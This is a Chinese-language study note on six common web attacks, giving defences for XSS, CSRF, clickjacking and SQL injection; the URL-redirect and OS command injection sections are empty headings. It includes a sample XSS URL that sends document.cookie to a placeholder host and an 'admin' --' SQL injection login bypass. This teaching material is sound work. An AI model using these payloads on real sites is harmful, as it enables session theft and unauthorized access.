# 常见六大Web安全攻防解析

## XSS
跨站脚本攻击，通过注入运行非法js脚本或html标签对存在web安全漏洞的网站进行攻击的一种方式。XSS攻击有两种，非持久型和持久型。

### 非持久型

一般是通过给别人发送带有恶意参数的URL，当URL被打开时，这些参数会被浏览器解析运行从而达到窃取用户数据或其他攻击目的。

比如有一个url长这样

```
    http://www.example.com?arg=xxx
```

前端代码长这样
```js
    let arg = location.href.substring(location.href.indexOf('arg=') + 4);
    document.write(arg);
```

那攻击者可以这样修改参数进行攻击

```http://www.example.com?arg=<img src="xx" onerror="post('pianzi.com?cakemonster=' + escape(document.cookie))"/>```

特点：

- 需要用户点击恶意链接
- 通过一次请求（点击链接）完成攻击
- 难以发现和修复

防御：

- 尽量确保web页面的渲染数据来自服务器（不要用url传参这种）
- 尽量不使用document.write(), eval(), innerHTML这种可以执行字符串的方法
- 涉及dom渲染前对传入字符串参数进行转义操作

### 持久型

通过表单输入等方式输入并提交恶意脚本到服务器数据库，后前端页面从服务器获取该数据会渲染执行恶意脚本。

这种攻击方式直接以正常功能提交即可，比如文章评论。个人觉得危害比非持久型要大，只要需要获取该数据的客户端就有可能收到攻击。但这种攻击可以实现的条件也比较苛刻。需要前后端都没有做字符转义且前端拿到数据后直接dom渲染。

特点：
- 持久性，恶意脚本存储在数据库中
- 危害更大

防御：
- 字符转义
- CSP

    通过\<meta>标签或http头部Content-Security-Policy字段可以设置网站资源的来源限制，比如设置了script-src 'self'则只信任当前域名的脚本，其他来源脚本则浏览器会报错
- 给cookie设置httponly
    
    因为脚本攻击一般是为了获取用户的cookie，设置httponly后不能通过document.cookie获取cookie，从而达到防御目的。

## CSRF

攻击原理：

![CSRF的攻击原理](./imgs/CSRF的攻击原理.jpg "")

个人感觉csrf应该是配合xss攻击的，通过xss注入恶意脚本，把网站b的链接渲染到网页上（比如澳门在线小广告），误点带上用户的cookie做一些操作

防御：
- 不让骗子网站链接出现在被信任网站上（xss防御）
- 用户访问第三方网站不带cookie

    可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送
- 限制访问第三方网站

    通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击
- 请求的时候带验证信息

    目前比较完善的解决方案是加入Anti-CSRF-Token。即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。
- get请求不修改信息

## 点击劫持

攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。（UI覆盖攻击？）

防御：
- 设置响应头X-FRAME-OPTIONS
    - DENY，表示页面不允许通过 iframe 的方式展示
    - SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
    - ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示

- 通过js防御
    ```html
        <head>
            <style id="click-jack">
                html {
                display: none !important;
                }
            </style>
        </head>
        <body>
            <script>
                if (self == top) {
                    var style = document.getElementById('click-jack')
                    document.body.removeChild(style)
                } else {
                    top.location = self.location
                }
            </script>
        </body>
    ```

## SQL注入

通过表单输入部分sql语句达到攻击手段。举个例子，现在有一个登陆表单，大概是这样：

```html
    <form action="/login" method="POST">
        <p>Username: <input type="text" name="username" /></p>
        <p>Password: <input type="password" name="password" /></p>
        <p><input type="submit" value="登陆" /></p>
    </form>
```

后端拿到username和password进行查表操作的sql语句

```sql
    SELECT * FROM user WHERE username='xxx' AND password='xxx';
```

然后黑客输入username为 ```admin' --``` 。sql语句变成了

```sql
    SELECT * FROM user WHERE username='admin' --' AND password='xxx';
```

防御：

- 检查输入字符，对特殊字符（sql语句相关 比如 - ）进行转义操作
- 不使用管理员进行数据库连接，为app单独设置数据有限的数据库连接
- 不直接动态拼接sql语句，使用参数化sql或者存储过程进行存取

## URL跳转漏洞

## OS命令注入攻击
